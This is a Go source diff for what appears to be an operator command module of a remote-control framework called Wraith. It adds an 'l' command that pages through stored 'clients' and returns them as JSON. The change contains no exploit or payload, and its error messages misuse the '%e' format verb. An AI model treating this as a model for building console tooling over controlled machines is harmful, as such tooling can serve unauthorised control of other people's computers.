@@ -1,8 +1,10 @@
 package main
 
 import (
+	"encoding/json"
 	"fmt"
 	"reflect"
+	"strconv"
 	"strings"
 
 	"dev.l1qu1d.net/wraith-labs/wraith-module-pinecomms/cmd/pc3/lib"
@@ -53,6 +55,19 @@ func CmdX(ctx lib.CommandContext, arg string) (response string, errResponse erro
 	return communicator(ctx)
 }
 
+func CmdL(ctx lib.CommandContext, arg string) (string, error) {
+	page, err := strconv.Atoi(arg)
+	if err != nil {
+		return "", fmt.Errorf("could not parse argument: %e", err)
+	}
+	clients, err := ctx.State.ClientGetPage(page*10, 10)
+	if err != nil {
+		return "", fmt.Errorf("could not get page from database: %e", err)
+	}
+	clientListString, _ := json.Marshal(clients)
+	return string(clientListString), nil
+}
+
 func CmdH(ctx lib.CommandContext, arg string) (string, error) {
 	switch strings.ToLower(arg) {
 	case "":
@@ -67,6 +82,8 @@ func ExecCmd(ctx lib.CommandContext, command string) (string, error) {
 	switch strings.ToLower(keyword) {
 	case "x":
 		return CmdX(ctx, arg)
+	case "l":
+		return CmdL(ctx, arg)
 	case "h":
 		return CmdH(ctx, arg)
 	}
